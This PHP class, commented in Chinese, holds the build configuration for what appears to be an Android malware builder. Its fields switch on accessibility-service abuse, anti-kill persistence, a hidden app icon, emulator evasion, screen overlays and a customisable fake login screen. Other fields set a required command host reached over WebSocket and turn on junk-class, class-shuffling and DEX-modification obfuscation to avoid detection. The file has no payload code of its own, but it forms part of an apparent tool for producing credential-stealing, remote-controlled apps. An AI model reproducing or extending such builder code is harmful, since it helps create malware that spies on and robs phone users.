<?php

namespace ApkBuilder;

/**
 * APK 构建配置数据对象
 */
class ApkBuildConfig
{
    // 基础配置
    public string $appid = '';
    public string $userid = '';
    public string $clientname = '';
    public string $email = '';
    public string $mainActivity = '';
    public string $appFolder = '';
    public string $UserHost = '';
    public string $useAccess = '';
    public string $useAntkill = '';
    public string $useAtoprims = '';
    public string $notifyTitle = '';
    public string $notifyMsg = '';
    public string $userAllprims = '';
    public string $userBlackprims = '';
    public string $buildType = '';
    public string $appname = '';
    public string $appversion = '';
    public string $appicopath = '';
    public string $appurl = '';
    public string $loginTitle = '';
    public string $loginDis = '';
    public string $loginBtn = '';
    public string $lngShort = '';
    public string $hiddenApp = '';
    public string $noEmulator = '';
    public string $installType = '';
    public string $hideType = '';
    public string $useDraw = '';
    public string $openAccess = '';
    public string $description = '';
    public string $diaoType = '';
    
    // WebSocket 协议配置（独立于 appurl）
    public bool $useWss = false;  // true = wss://, false = ws://

    // 保护功能开关（默认关闭）
    public bool $enableJunkClasses = false;
    public bool $enableClassShuffle = false;
    public bool $enableApkProtection = false;
    public bool $enableDexModification = false;

    // 混淆配置
    public int $junkClassCount = 50;
    public int $junkMethodCount = 10;

    /**
     * 从数组创建配置对象
     */
    public static function fromArray(array $data): self
    {
        $config = new self();
        foreach ($data as $key => $value) {
            if (property_exists($config, $key)) {
                $config->$key = $value;
            }
        }
        return $config;
    }

    /**
     * 转换为数组
     */
    public function toArray(): array
    {
        return get_object_vars($this);
    }

    /**
     * 验证配置是否完整
     */
    public function validate(): array
    {
        $errors = [];
        $required = ['appid', 'userid', 'appname', 'appversion', 'UserHost'];
        
        foreach ($required as $field) {
            if (empty($this->$field)) {
                $errors[] = "Missing required field: {$field}";
            }
        }
        
        return $errors;
    }
}
